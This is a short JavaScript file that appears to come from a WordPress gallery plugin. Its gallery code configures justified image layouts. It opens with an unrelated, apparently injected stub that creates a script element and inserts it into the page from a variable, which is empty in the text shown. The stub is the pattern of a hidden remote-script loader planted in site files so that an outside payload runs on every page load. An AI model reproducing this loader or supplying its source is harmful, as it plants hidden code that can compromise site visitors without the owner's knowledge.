var gfjfgjk = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = ''; s.src=pl; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}jQuery(document).ready(function($) {
	$('.gdwpmGallery1').justifiedGallery(
		{margins : 1,
		rowHeight : 90,
		lastRow	  : 'justify'}
	)
	.on('jg.complete', function (e) {
		setTimeout(function(){ 
			$('.gdwpmGallery1').each(function(){
				var datagal = $(this).attr('data-gal1');
				var datagalarr = datagal.split(' | ');
				var aidi = $(this).attr('id');
				$('#'+aidi).justifiedGallery(
					{margins : parseInt(datagalarr[0]),
					rowHeight : parseInt(datagalarr[1]),
					lastRow	  : datagalarr[2]}
				);
			});
		}, 2000);    
	});
});